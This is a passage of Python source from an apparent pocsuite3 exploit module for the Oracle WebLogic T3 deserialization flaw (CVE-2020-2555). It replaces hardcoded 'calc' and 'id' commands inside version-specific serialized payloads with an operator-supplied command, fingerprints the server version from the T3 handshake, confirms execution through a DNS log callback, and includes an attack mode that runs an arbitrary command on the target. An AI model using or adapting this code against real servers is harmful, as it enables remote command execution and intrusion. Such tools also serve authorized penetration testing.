            #ser_12_2_1_3_win_custom = self.replace_payload(ser_12_2_1_3_cmd_c_calc, cmd_with_lenth, True)
            ser_12_2_1_3_win_custom = ser_12_2_1_3_cmd_c_calc_for.format(cmd_with_lenth)
            ser_12_2_1_3_lin_custom = self.replace_payload(ser_12_2_1_3_bash_c_id, cmd_with_lenth, False)

            return [ser_12_2_1_3_win_custom, ser_12_2_1_3_lin_custom]
        elif p_version == '12.1.3.0.0':
            #ser_12_1_3_0_win_custom = self.replace_payload(ser_12_1_3_0_cmd_c_calc, cmd_with_lenth, True)
            ser_12_1_3_0_win_custom = ser_12_1_3_0_cmd_c_calc_for.format(cmd_with_lenth)
            ser_12_1_3_0_lin_custom = self.replace_payload(ser_12_1_3_0_bash_c_id, cmd_with_lenth, False)

            return [ser_12_1_3_0_win_custom, ser_12_1_3_0_lin_custom]

        return ['', '']



    # eg. HELO:14.1.1.0.0.false\nAS:2048\nHL:19\nMS:10000000\nPN:DOMAIN\n\n
    # Ref: https://github.com/rabbitmask/WeblogicScan/blob/master/poc/Whoareu.py
    def get_version_by_t3(self, resp):
        return (re.findall(r'HELO:(.*?).false', resp.decode()))[0]


    # 根据之前硬编码的bash -c id，和cmd /c calc使用实际的命令进行替换
    def replace_payload(self, p_payload, p_cmd_with_lenth, p_iswin=True):
        payload = p_payload
        if p_iswin:    # Windows平台的命令
            print("windows")
            logger.info(payload)
            payload = payload.replace("000463616C63", p_cmd_with_lenth)
        else:        # Linux平台的命令
            print("linux")
            logger.info(payload)
            payload = p_payload.replace("00026964", p_cmd_with_lenth)
            #return result

        return payload


    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url, timeout=5)   # , proxies={'http': 'http://127.0.0.1:8087'})    # proxies={'http': 'http://127.0.0.1:8087'},
        try:
            if 'True' in resp.text:
                return True
        except Exception:
            return False           


    # 攻击模块
    # 参考：https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/ecshop_rce.py
    def _attack(self):
        cmd = self.get_option("command")
        result = dict()
        result['Stdout'] = self._verify(cmd)
        return self.save_output(result)



    def _options(self):
        o = OrderedDict()
        o["command"] = OptDict(selected="bash")
        return o


    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
            output.show_result()
        else:
            output.fail()
        return output


# 注册类
register_poc(Weblogic_2020_2555)
